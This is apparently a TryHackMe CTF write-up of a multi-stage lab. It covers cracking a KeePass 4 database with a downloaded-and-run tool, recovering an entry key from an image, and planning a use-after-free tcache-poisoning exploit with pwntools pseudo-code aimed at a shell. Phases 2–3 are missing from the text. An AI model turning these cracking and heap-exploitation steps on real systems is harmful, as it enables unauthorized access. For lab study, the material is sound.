Scheme Catcher

TryHackMe Advent of Cyber 2025 - Side Quest 2

IN PROGRESS - FINAL EXPLOIT PHASE
/ 01

The Challenge

Scheme Catcher is a side quest in the Advent of Cyber 2025 event on TryHackMe. This is a multi-stage challenge that tests skills across multiple domains: password cracking, web enumeration, reverse engineering, heap exploitation, and privilege escalation. The target machine runs a web server on port 80, a custom binary on port 9004, and SSH on port 22 (restricted).

Unlike typical CTF challenges, Scheme Catcher requires obtaining an entry key from a completely different room (Advent of Cyber Day 9 - "Attacks on encrypted files") before the main machine becomes accessible. This inter-room dependency adds an extra layer of complexity.

/ 02

Phase 1: Obtaining the Entry Key

The Scheme Catcher machine is locked behind an entry key. To get this key, I had to first complete the Day 9 room "Attacks on encrypted files" and locate a hidden KeePass database.

2.1 Accessing the Day 9 Machine

Using the provided SSH credentials, I connected to the Day 9 target:

ssh ubuntu@10.113.166.160
Password: AOC2025Ubuntu!

2.2 Finding the KeePass Database

Inside the Ubuntu home directory, I found a hidden file:

ubuntu@tryhackme:~$ ls -la
-rw------- 1 ubuntu ubuntu 419413 Dec 4 09:29 .Passwords.kdbx

This is a KeePass 4 database (KDBX v4). The challenge required cracking it to retrieve the entry key for Scheme Catcher.

2.3 The Problem with KDBX4

Standard tools like keepass2john do NOT support KeePass 4 databases. Attempting to use it resulted in an error:

keepass2john .Passwords.kdbx
! .Passwords.kdbx : File version '40000' is currently not supported!

KeePass 4 uses Argon2 as its key derivation function, which is deliberately slow and memory-hard to resist brute-force attacks. This makes cracking significantly more difficult than older KDBX formats.

2.4 Cracking with KDBXcrack

I used a specialized tool called KDBXcrack that supports KDBX4 and can leverage GPU acceleration:

wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcrack/refs/heads/main/KDBXcrack"
chmod +x KDBXcrack
./KDBXcrack -f .Passwords.kdbx -w /usr/share/wordlists/rockyou.txt

2.5 Extracting the Entry Key

With the database unlocked, I used pykeepass (a Python library that supports KDBX4) to extract the contents:

python3 -c "
from pykeepass import PyKeePass
kp = PyKeePass('.Passwords.kdbx', password='harrypotter')
for entry in kp.entries:
    print(f'Title: {entry.title}')
    if entry.attachments:
        for att in entry.attachments:
            print(f'Attachment: {att.filename}')
            with open(att.filename, 'wb') as f:
                f.write(att.data)
"

Title: Key
Attachment: sq2.png
Saved to: sq2.png

The attachment was an image of an egg with text written on it. Using OCR (tesseract) to extract the text:

tesseract sq2.png stdout
tit_for_tat
SCHEME CATCHER ENTRY KEY
tit_for_tat
Why this worked: The KeePass database contained an image attachment rather than plain text. This is a common anti-forensics technique to hide sensitive data in plain sight.

/ 05

Phase 4: Reverse Engineering the Server Binary

The file 4.2.0-R1-1337-server.zip contained the custom server binary running on port 9004. This is the main attack surface for gaining a shell on the target.

5.1 Binary Security Analysis

Using checksec to examine the binary's security features:

checksec --file=server

RELRO           STACK CANARY      NX            PIE
Full RELRO      Canary found      NX enabled    PIE enabled

All modern mitigations were enabled:

  • Full RELRO: The Global Offset Table (GOT) is read-only. GOT hijacking is impossible.
  • Stack Canary: Stack buffer overflows would trigger a crash before control can be gained.
  • NX (No-Execute): Shellcode cannot be executed on the stack or heap.
  • PIE (Position Independent Executable): The binary base address is randomized by ASLR.

These mitigations ruled out simple buffer overflow or GOT overwrite attacks. The vulnerability had to be elsewhere.

5.2 Program Functionality

Connecting to the service on port 9004 revealed a menu-driven interface:

nc -nv 10.113.128.30 9004

Payload Storage Malhare's
Version 4.2.0
[1] C:
[2] U:
[3] D:
[4] E:
>>

The four options correspond to:

OptionFunctionSystem Call
1Create (C:)malloc(size) - allocates a chunk
2Update (U:)writes data to existing chunk at offset
3Delete (D:)free(chunk) - deallocates memory
4Exit (E:)terminates the program

5.3 Identifying the Vulnerability

I extracted the addresses of global arrays using objdump:

objdump -t server | grep -E "chunks|sizes"

0000000000004060 g O .bss 00000000000007c8 chunks
0000000000004840 g O .bss 00000000000007c8 sizes

The chunks array stores pointers to allocated memory. The sizes array stores the corresponding chunk sizes.

The critical flaw: When a chunk is deleted (option 3), the free() function is called, but the pointer in the chunks array is not nullified. The Update function (option 2) does not check whether a chunk has been freed before writing to it.

This is a classic Use-After-Free (UAF) vulnerability. By deleting a chunk and then updating it, we can write to freed memory - specifically, we can overwrite the forward pointer (fd) of a freed tcache chunk.

5.4 The GOT entries

I also enumerated the GOT entries to understand what functions could be targeted:

objdump -R server

OFFSET           TYPE              VALUE
0000000000003f90 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
0000000000003fa0 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000003fb0 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000003fb8 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000003fc0 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5
0000000000003fd0 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7

However, Full RELRO prevented direct GOT overwrites. The attack needed to target heap metadata instead.

/ 06

Phase 5: Exploiting Use-After-Free with Tcache Poisoning

6.1 Understanding Tcache

Modern versions of glibc (including the one provided with the binary) use the "tcache" (thread-local caching) for small allocations. When a chunk is freed, it goes into a tcache bin. The bin is a singly-linked list where the chunk's fd (forward) pointer points to the next free chunk.

If we can overwrite the fd pointer of a freed chunk, we can make the allocator return an arbitrary address on the next allocation. This is called tcache poisoning.

6.2 Exploit Strategy

The plan was:

  1. Allocate a chunk of size 0x80 (goes into tcache bin 0x80 on free).
  2. Free the chunk (returns to tcache, fd points to next free or null).
  3. Use the UAF to overwrite the fd pointer to point to chunks - 0x10 (an address near the global chunks array).
  4. Allocate a new chunk of the same size. The allocator returns the original freed chunk (tcache behavior).
  5. Allocate a second chunk. This time, the allocator follows the poisoned fd pointer and returns the address we specified (chunks - 0x10).
  6. Now we can write to this address, which is just before the chunks array. By carefully calculating offsets, we can overwrite entries in the chunks array itself.
  7. Overwrite a chunks array entry to point to the stdout FILE structure (address 0x4020).
  8. Use the Update function to read from that entry, leaking a libc address (since stdout contains pointers to libc).
  9. With a known libc base, calculate the address of system().
  10. Overwrite another chunks entry to point to a writable location, then write system() address.
  11. Trigger the function via the Update or Delete operation to call system("/bin/sh").

6.3 The Exploit Code (Pseudo)

from pwn import *

# Addresses from objdump
CHUNKS_ARRAY = 0x4060
STDOUT = 0x4020

# Step 1: Create and free
create(0x80)
delete(0)

# Step 2: Poison fd pointer
target_addr = CHUNKS_ARRAY - 0x10
update(0, 0, p64(target_addr))

# Step 3: Trigger poisoned allocation
create(0x80)  # reuses freed chunk
create(0x80)  # returns target_addr

# Step 4: Overwrite chunks[0] to point to STDOUT
update(1, 0, p64(STDOUT))

# Step 5: Leak libc by reading from STDOUT
leak = read_chunk(0)
libc_base = u64(leak[:8]) - libc.symbols['_IO_2_1_stdout_']

# Step 6: Calculate system address
system_addr = libc_base + libc.symbols['system']

Key Takeaways (So Far)

  • KDBX4 cracking requires specialized tools: Standard keepass2john fails on KeePass 4. Tools like KDBXcrack or keepass4brute are necessary, but expect slow speeds due to Argon2.
  • Hidden directories often use confusing characters: The path /7ln6Z1X9EF uses a lowercase 'L' that is easily mistaken for an uppercase 'I'. Always verify directory listings carefully.
  • Always run strings on unknown binaries: The first flag was simply embedded as a plaintext string in beacon.bin. The beacon's activation key "EastMass" was also found this way.
  • Full RELRO prevents GOT hijacking but not heap exploitation: Tcache poisoning remains viable even with all mitigations enabled.
  • Provided libc files are critical: The zip included specific versions of ld-linux and libc.so.6. Using these locally ensures offset calculations match the remote target.
